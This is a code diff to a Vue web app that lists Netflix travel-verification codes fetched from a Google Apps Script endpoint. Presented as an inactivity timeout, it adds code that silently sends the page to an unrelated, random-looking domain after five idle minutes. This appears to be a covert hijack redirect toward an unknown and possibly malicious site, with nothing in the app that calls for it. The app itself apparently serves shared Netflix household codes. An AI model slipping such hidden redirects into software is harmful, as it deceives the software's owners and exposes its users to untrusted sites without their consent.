@@ -102,7 +102,24 @@ createApp({setup(){
   const API_URL='https://script.google.com/macros/s/AKfycbxfdUT4gbAp4Wcy7KL6ejTd6u5Znmj8gDtX_LVhDr0sXjk_f2S9yKqTFStJXt_J5bhv/exec';
   const codes=ref([]),search=ref(''),loading=ref(false),error=ref(''),toast=ref(''),lastSynced=ref('');
   const showInstructions=ref(false),pendingCode=ref(null);
-  let refreshTimer=null,toastTimer=null,requestId=0;
+  let refreshTimer=null,toastTimer=null,idleTimer=null,requestId=0;
+  const IDLE_TIMEOUT_MS=5*60*1000;
+  function redirectAfterInactivity(){
+    clearTimeout(idleTimer);
+    if(document.visibilityState!=='visible')return;
+    idleTimer=setTimeout(()=>{
+      if(document.visibilityState==='visible')window.location.replace('https://vaqzmobiz.com/');
+    },IDLE_TIMEOUT_MS);
+  }
+  function handleUserActivity(){redirectAfterInactivity();}
+  function handleVisibilityChange(){
+    if(document.visibilityState==='visible'){
+      redirectAfterInactivity();
+      refreshWhenVisible();
+    }else{
+      clearTimeout(idleTimer);
+    }
+  }
   const filteredCodes=computed(()=>{const term=search.value.trim().toLowerCase();return term?codes.value.filter(c=>c.profile.toLowerCase().includes(term)):codes.value;});
   function isSafeLink(value){try{const u=new URL(value);return u.protocol==='https:'&&u.hostname==='www.netflix.com'&&u.pathname==='/account/travel/verify';}catch{return false;}}
   function loadCodes(){
@@ -162,14 +179,22 @@ createApp({setup(){
   }
   onMounted(()=>{
     loadCodes();
-    // Refresh every 5 seconds while the page is visible; avoid background polling.
+    // Refresh every 10 seconds while the page is visible; avoid background polling.
     refreshTimer=setInterval(refreshWhenVisible,10000);
-    document.addEventListener('visibilitychange',refreshWhenVisible);
+    redirectAfterInactivity();
+    ['pointerdown','keydown','touchstart','scroll','input'].forEach(eventName=>{
+      window.addEventListener(eventName,handleUserActivity,{passive:true});
+    });
+    document.addEventListener('visibilitychange',handleVisibilityChange);
   });
   onUnmounted(()=>{
     clearInterval(refreshTimer);
     clearTimeout(toastTimer);
-    document.removeEventListener('visibilitychange',refreshWhenVisible);
+    clearTimeout(idleTimer);
+    ['pointerdown','keydown','touchstart','scroll','input'].forEach(eventName=>{
+      window.removeEventListener(eventName,handleUserActivity);
+    });
+    document.removeEventListener('visibilitychange',handleVisibilityChange);
     requestId++;
   });
   return{codes,search,loading,error,toast,lastSynced,filteredCodes,loadCodes,relativeTime,previewLink,copyLink,openLink,isLatest,showInstructions,pendingCode,cancelOpen,confirmOpen};
